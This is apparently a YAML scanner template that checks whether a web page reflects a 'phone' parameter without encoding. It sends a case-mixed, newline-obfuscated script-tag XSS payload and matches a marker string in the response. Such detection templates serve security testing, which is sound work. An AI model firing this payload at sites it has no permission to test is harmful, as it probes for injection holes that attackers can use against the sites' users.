id: xss5-0819
name: 'Raw XSS5 in phone'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in phone'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      phone:
        - '<ScRiPt%0a>alert(nx50818)</ScRiPt>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50818'
